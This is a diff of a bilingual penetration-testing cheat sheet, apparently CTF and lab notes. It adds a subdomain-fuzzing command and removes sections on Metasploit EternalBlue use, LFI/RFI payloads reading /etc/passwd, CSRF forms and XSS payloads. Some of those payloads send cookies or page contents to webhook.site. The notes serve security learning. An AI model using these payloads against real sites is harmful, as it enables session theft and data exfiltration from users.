@@ -88,136 +88,17 @@ gobuster dns -w /usr/share/seclists/Discovery/DNS/namelist.txt -d domain.com
 ```
 gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 --append-domain -u http://$ip/
 ```
+```
+ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.244.139 -fs 2395
+```
 ## _online enumeration_
 ```
 sublist3r -d domaine_name -b /usr/lib/python3/dist-packages/subbrute/names.txt
 ```
-
-|
 # Amazone s3 buckets interact with awscli
 	| `aws configure` | |
 	| `aws --endpoint=http://s3.domaine_name s3 ls s3://domaine_name` | list s3 bucket container |
-|
 
-|
-# Public Exploits
-Rechercher un exploit sur l'application et les services hébergé
-	| `searchsploit openssh 7.2` | Search for public exploits for a web application |
-	| `msfconsole` | MSF: Start the Metasploit Framework |
-	| `search exploit eternalblue` | MSF: Search for public exploits in MSF |
-	| `use exploit/windows/smb/ms17_010_psexec` | MSF: Start using an MSF module |
-	| `show options` | MSF: Show required options for an MSF module |
-	| `set RHOSTS 10.10.10.40` | MSF: Set a value for an MSF module option |
-	| `check` | MSF: Test if the target server is vulnerable |
-	| `exploit` | MSF: Run the exploit on the target server is vulnerable |
-|
-# Web Exploits
-## curl
-```
-curl -H "Content-type: application/json" --Cookie "<name>=<value>" -d '{"data":"data"}' -X POST http://domaine
-```
-
-## Git
-git-dumper
-## LFI 
-#Exploit_LFI/RFI
-LFI (Local File Inclusion) est une vulnérabilité de sécurité informatique qui permet à un attaquant d'inclure des fichiers locaux sur un serveur distant.
-```
-http://adresse/?page=../etc/passwd
-```
-```
-http://adresse/?page=C:/WINDOWS/System32/drivers/etc/hosts
-```
-
-## RFI
-RFI (Remote File Inclusion) est une vulnérabilité de sécurité informatique similaire à la LFI, mais qui permet à un attaquant d'inclure des fichiers distants à partir d'un serveur malveillant sur un serveur distant.
-```
-http://remote@IP/?page=//@ip_hacker/somefile
-```
-
-## CSP
-#ExploitCSP[[CSP]]
-### Site de test CSP en ligne
-https://csp-evaluator.withgoogle.com/
-Google fournit une page Web de diagnostic (?) CSP appelée CSP Evaluator, et si vous la testez, elle vous informera des éléments CSP manquants. Il est normal de l'utiliser comme valeur de référence.
-### Bypass script-src unsafe-inline
-```
-<Svg OnLoad=alert(domain)>
-```
-```
-<img src="" onerror="alert(1)">
-```
-On peut modifier le domaine de base du site web par celui d'un serveur d'écoute pour recevoir les requêtes en écrivant du code js dans l'attribut *onerror*
-```
-// flag location in document
-var flag=document.querySelector("body > div > div > p").innerText;
-// bypass http and ':' filtering
-document.write("<base href=\"http+String.fromCharCode(58)+"//webhook.site"+"\" />");
-// redirect to webhook.site
-document.location="229885cb-f49d-41fc-b954-2e2c56a2248c?test="+flag;
-```
-ce qui donne le payload
-```
-<img src='#' onerror='var flag=document.querySelector("body").innerText;document.write("<base href=\"ht"+"tp"+String.fromCharCode(58)+"//webhook.site"+"\" />");document.location="dc09032a-d28b-47f5-9297-8ea08e0c945e?test="+flag;'>
-```
-### base url
-```
-
-```
-## CSRF
-#ExploitCSRF
-```
-<img src= x onerror='document.location="?action=profile";document.getElementByName('username').value = "dine";document.forms[0].submit();'>
-```
-
-```
-<form action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data">
-	<input type="hidden" name="username" value="username">
-	<input type="hidden" name="status" value="on">
-</form>
-<script>document.forms[0].submit()</script>
-```
-
-## XSS
-#ExploitXSS
-### Insertion de script
-```
-<script>alert("Coucou !");</script>
-```
-### Vole de cookie
-```
-<script>document.write('<img src = "https://webhook.site/c7363cfa-6251-42b1-9cbf-4cbad321b1bb?' + 'cookie='+ document.cookie + '">');</script>
-```
-### Redirection automatique
-```
-<script>document.location="http://www.hsc.fr/"</script>
-```
-Rend inutilisable la page générée ✗ L'utilisateur ne comprend pas la manipulation
-### Fixation de session
-✗ Principe : utiliser un XSS afin d'imposer un cookie connu à la victime 
-✗ Schéma : 
-✗ L'attaquant se connecte sur le serveur en mode anonyme 
- Il reçoit un cookie de session (ex JSP ou PHP) 
-✗ Il utilise un XSS sur un serveur du même domaine pour fixer le cookie chez la victime (via le code JavaScript de type 
-```
-<script> document.cookie="PHPSESSIONID=78191;domain=.site.fr" <script>
-```
-✗ Il attend que la victime s'authentifie sur le serveur. Si celui ci est mal programmé (exemple sessions J2EE), le cookie sera accepté. 
-✗ L'attaquant possède alors un cookie de session authentifié valide qu'il peut utiliser en parallèle avec la victime
-
-### Insertion de tags HTML
-#### En particulier le tags
-```
-<img src="https://webhook.site/da439638-ced7-48a8-9c0d-c0084e1d333a"/>
-```
-```
-<img src= x onerror(alerte(1))>
-```
-
-#### redirection
-```
-<script>document.location="https://webhook.site/da439638-ced7-48a8-9c0d-c0084e1d333a"</script>
-```
 # foothold exploit
 
 ## Partage des ports de la cible sur ma machine
